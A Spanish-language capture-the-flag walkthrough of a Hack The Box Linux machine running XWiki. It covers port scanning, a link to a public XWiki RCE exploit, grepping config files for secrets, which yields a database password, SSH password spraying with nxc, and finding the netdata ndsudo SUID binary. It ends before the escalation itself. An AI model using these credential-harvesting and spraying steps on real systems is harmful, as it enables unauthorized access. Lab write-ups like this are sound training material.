# Hack the Box: 

## Host: Linux
## IP: 10.10.11.80

## Procedimiento y comandos

#### Paso 1: Enumeracion

* Nmap

```bash
  nmap -A 10.10.11.80 -oN Editor-nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 12:53 -03
Nmap scan report for 10.10.11.80
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   161.51 ms 10.10.14.1
2   162.07 ms 10.10.11.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.25 seconds
```

* Robots:

```bash
  curl http://10.10.11.80:8080/robots.txt
User-agent: *
# Prevent bots from executing all actions except "view" and
# "download" since:
# 1) we don't want bots to execute stuff in the wiki by
#    following links! (for example delete pages, add comments,
#    etc)
# 2) we don't want bots to consume CPU and memory
#   (for example to perform exports)
Disallow: /xwiki/bin/viewattachrev/
Disallow: /xwiki/bin/viewrev/
Disallow: /xwiki/bin/pdf/
Disallow: /xwiki/bin/edit/
Disallow: /xwiki/bin/create/
Disallow: /xwiki/bin/inline/
Disallow: /xwiki/bin/preview/
Disallow: /xwiki/bin/save/
Disallow: /xwiki/bin/saveandcontinue/
Disallow: /xwiki/bin/rollback/
Disallow: /xwiki/bin/deleteversions/
Disallow: /xwiki/bin/cancel/
Disallow: /xwiki/bin/delete/
Disallow: /xwiki/bin/deletespace/
Disallow: /xwiki/bin/undelete/
Disallow: /xwiki/bin/reset/
Disallow: /xwiki/bin/register/
Disallow: /xwiki/bin/propupdate/
Disallow: /xwiki/bin/propadd/
Disallow: /xwiki/bin/propdisable/
Disallow: /xwiki/bin/propenable/
Disallow: /xwiki/bin/propdelete/
Disallow: /xwiki/bin/objectadd/
Disallow: /xwiki/bin/commentadd/
Disallow: /xwiki/bin/commentsave/
Disallow: /xwiki/bin/objectsync/
Disallow: /xwiki/bin/objectremove/
Disallow: /xwiki/bin/attach/
Disallow: /xwiki/bin/upload/
Disallow: /xwiki/bin/temp/
Disallow: /xwiki/bin/downloadrev/
Disallow: /xwiki/bin/dot/
Disallow: /xwiki/bin/delattachment/
Disallow: /xwiki/bin/skin/
Disallow: /xwiki/bin/jsx/
Disallow: /xwiki/bin/ssx/
Disallow: /xwiki/bin/login/
Disallow: /xwiki/bin/loginsubmit/
Disallow: /xwiki/bin/loginerror/
Disallow: /xwiki/bin/logout/
Disallow: /xwiki/bin/lock/
Disallow: /xwiki/bin/redirect/
Disallow: /xwiki/bin/admin/
Disallow: /xwiki/bin/export/
Disallow: /xwiki/bin/import/
Disallow: /xwiki/bin/get/
Disallow: /xwiki/bin/distribution/
Disallow: /xwiki/bin/jcaptcha/
Disallow: /xwiki/bin/unknown/
Disallow: /xwiki/bin/webjars/
```

* Encontramos un exploit para xwiki

[Exploit](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC)

```bash

```

#### Paso 2: Acceso inicial

* Buscamos credenciales

```bash
xwiki@editor:/usr/lib/xwiki-jetty$ grep -RiE "user|username|login|password|passwd|secret|apikey|api_key|token" --include="*.xml" .                                                                                
<wd|secret|apikey|api_key|token" --include="*.xml" .                                                                                                                                                              
./webapps/xwiki/WEB-INF/cache/infinispan/config.xml:         We don't use JBossUserMarshaller (the previous default) because it's now deprecated.                                                                 
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>                                                                                           
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">sa</property>                                                                                                        
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>                                                                                                          
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>                                                                                                     
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.username">sa</property>                                                                                                        
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>                                                                                                          
./webapps/xwiki/WEB-INF/web.xml:       expired authentication token, and the authorization module redirects to the login page, all the information sent                                                           
./webapps/xwiki/WEB-INF/web.xml:       by the client would be lost; this filter allows to save all that information, and after a successful login,                                                                
./webapps/xwiki/WEB-INF/web.xml:    <!-- Users could add other filters that execute before it, like the URLRewriteFilter, and if these filters do a -->
./webapps/xwiki/WEB-INF/web.xml:  <!-- Redirects to the Main.WebHome page if the user calls the root of the webapp, i.e. -->                                                              
./jetty/etc/jetty-ssl-context.xml:        <Set name="KeyStorePassword"><Property name="jetty.sslContext.keyStorePassword" /></Set> -->                                                                                
./jetty/etc/jetty-ssl-context.xml:        <Set name="KeyManagerPassword"><Property name="jetty.sslContext.keyManagerPassword" /></Set> -->                                                                            
./jetty/etc/jetty-ssl-context.xml:        <Set name="TrustStorePassword" property="jetty.sslContext.trustStorePassword" />  -->                                                                        
xwiki@editor:/usr/lib/xwiki-jetty$
```

#### Paso 3: Movimiento lateral

* Propagamos las credenciales

```bash
  nxc ssh 10.10.11.80 -u users.txt -p passwords.txt
SSH         10.10.11.80     22     10.10.11.80      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.10.11.80     22     10.10.11.80      [-] sa:theEd1t0rTeam99
SSH         10.10.11.80     22     10.10.11.80      [-] xwiki:theEd1t0rTeam99
SSH         10.10.11.80     22     10.10.11.80      [+] oliver:theEd1t0rTeam99  Linux - Shell access!
```

* Nos conectamos por ssh

```bash
  ssh oliver@10.10.11.80 

oliver@editor:~$ groups
oliver netdata

```

#### Paso 4: Escalada de privilegios

* Buscamos vectores para escalar privilegios

```bash
oliver@editor:~$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network                                                                                                                                                         
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin                                                                                                                                                  
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners                                                                                                                                                        
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo  <-- posible vector
/opt/netdata/usr/libexec/netdata/plugins.d/ioping                                                                                                                                                                 
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin                                                                                                                                                          
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin                                                                                                                                                            
/usr/bin/newgrp                                                                                                                                                                                                   
/usr/bin/gpasswd                                                                                                                                                                                                  
/usr/bin/su                                                                                                                                                                                                       
/usr/bin/umount                                                                                                                                                                                                   
/usr/bin/chsh                                                                                                                                                                                                     
/usr/bin/fusermount3                                                                                                                                                                                              
/usr/bin/sudo                                                                                                                                                                                                     
/usr/bin/passwd                                                                                                                                                                                                   
/usr/bin/mount                                                                                                                                                                                                    
/usr/bin/chfn                                                                                                                                                                                                     
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                                       
/usr/lib/openssh/ssh-keysign                                                                                                                                                                                      
/usr/libexec/polkit-agent-helper-1 

oliver@editor:~$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help                                                                                                                                         
                                                                                                                                                                                                                  
ndsudo                                                                                                                                                                                                            
                                                                                                                                                                                                                  
(C) Netdata Inc.                                                                                                                                                                                                  
                                                                                                                                                                                                                  
A helper to allow Netdata run privileged commands.                                                                                                                                                                
                                                                                                                                                                                                                  
  --test                                                                                                                                                                                                          
    print the generated command that will be run, without running it.                                                                                                                                             

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and . 
```

